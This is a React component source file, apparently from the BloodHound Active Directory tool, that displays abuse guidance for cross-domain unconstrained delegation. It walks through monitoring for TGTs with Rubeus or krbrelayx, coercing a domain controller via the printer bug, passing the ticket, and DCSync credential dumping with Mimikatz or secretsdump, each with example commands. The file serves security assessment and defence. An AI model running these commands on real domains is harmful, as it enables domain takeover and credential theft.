// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';
import CodeController from '../CodeController/CodeController';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                TGT delegation allows an attacker to capture TGTs of privileged users or computers in the target domain
                when they authenticate against a system configured with unconstrained delegation.
            </Typography>

            <Typography variant='body2'>
                A common attack method involves the attacker logging into a DC of the source domain and coercing a DC of
                the target domain. Since DCs have unconstrained delegation enabled by default, this grants the attacker
                a TGT for a target domain DC, which can then be used to perform a DCSync attack on the target domain.
                This guide details that version of the attack.
            </Typography>

            <Typography variant='body2'>
                Alternatively, attackers can target other privileged computers or users besides DCs.
            </Typography>

            <Typography variant='body2'>
                The attack will fail if the target is a member of Protected Users or is marked as not trusted for
                delegation, as their TGTs will not be sent to hosts with unconstrained delegation. You can identify all
                protected principals using the following Cypher query in BloodHound:
            </Typography>

            <CodeController>
                {`MATCH (g:Group)
    WHERE g.objectid ENDS WITH "-525"
    MATCH (n:Base)
    WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
    RETURN n
    LIMIT 1000`}
            </CodeController>

            <Typography variant='body2'>
                Attackers can also exploit non-DC hosts or users in the source domain with unconstrained delegation
                enabled. To find all non-DC principals with unconstrained delegation in BloodHound, run:
            </Typography>

            <CodeController>
                {`MATCH (n:Base)
    WHERE n.unconstraineddelegation = TRUE AND NOT (n)-[:DCFor]->()
    RETURN n`}
            </CodeController>

            <Typography variant='body1'>Step 1: Start Monitoring for TGTs</Typography>

            <Typography variant='body2'>
                <b>Windows:</b>
            </Typography>
            <Typography variant='body2'>
                Log into a DC of the source domain and open a command prompt as Administrator.
            </Typography>
            <Typography variant='body2'>Start monitoring for incoming TGTs using Rubeus:</Typography>

            <Typography component={'pre'}>
                {'Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap'}
            </Typography>

            <Typography variant='body2'>
                <b>Linux:</b>
            </Typography>
            <Typography variant='body2'>
                Obtain credentials for a computer or user with unconstrained delegation.
            </Typography>
            <Typography variant='body2'>
                Start monitoring for incoming TGTs using krbrelayx.py with the credentials of the unconstrained
                delegation account:
            </Typography>

            <Typography component={'pre'}>
                {'krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab'}
            </Typography>

            <Typography variant='body1'>Step 2: Coerce the Target DC</Typography>
            <Typography variant='body2'>
                The printer bug is abused in this example. If the Print Spooler service is disabled on the target host,
                alternative coercion techniques must be used. See "Windows Coerced Authentication Methods" under
                References for details.
            </Typography>

            <Typography variant='body2'>
                To coerce the target DC, Authenticated Users access is required in the target domain. If the trust
                relationship is bidirectional, all principals in the source domain have this access by default. If not,
                coercion must be executed as a principal from the target forest. Attackers can obtain such a session
                using the trust account attack. See "SID Filter as a Security Boundary Between Domains? (Part 7) - Trust
                Account Attack" under References for details.
            </Typography>

            <Typography variant='body2'>
                <b>Windows:</b>
            </Typography>
            <Typography variant='body2'>
                From any host in the domain, coerce the target DC using SpoolSample:
            </Typography>

            <Typography component={'pre'}>
                {'SpoolSample.exe targetdc.domain.local compromiseddc.otherdomain.local'}
            </Typography>

            <Typography variant='body2'>Rubeus will print the DC TGT as soon as it is received.</Typography>

            <Typography variant='body2'>
                <b>Linux:</b>
            </Typography>
            <Typography variant='body2'>Coerce the target DC using printerbug.py:</Typography>

            <Typography component={'pre'}>
                {"printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised DC IP>"}
            </Typography>

            <Typography variant='body2'>krbrelayx.py will save the received TGT to disk.</Typography>

            <Typography variant='body1'>Step 3: Pass the Ticket</Typography>

            <Typography variant='body2'>
                <b>Windows:</b>
            </Typography>
            <Typography variant='body2'>Inject the DC TGT into memory using Rubeus:</Typography>

            <Typography component={'pre'}>{'Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...'}</Typography>

            <Typography variant='body2'>
                <b>Linux:</b>
            </Typography>
            <Typography variant='body2'>Set the KRB5CCNAME environment variable to the ticket's path:</Typography>

            <Typography component={'pre'}>{'export KRB5CCNAME=$path_to_ticket.ccache'}</Typography>

            <Typography variant='body1'>Step 4: DCSync the Target Domain</Typography>

            <Typography variant='body2'>
                <b>Windows:</b>
            </Typography>
            <Typography variant='body2'>
                Use Mimikatz to DCSync the target domain from the machine where the DC TGT was injected:
            </Typography>

            <Typography component={'pre'}>
                {'lsadump::dcsync /domain:domain.local /user:DOMAIN\\Administrator'}
            </Typography>

            <Typography variant='body2'>
                <b>Linux:</b>
            </Typography>
            <Typography variant='body2'>Use secretsdump.py to DCSync the target domain:</Typography>

            <Typography component={'pre'}>
                {'secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>'}
            </Typography>
        </>
    );
};

export default Abuse;
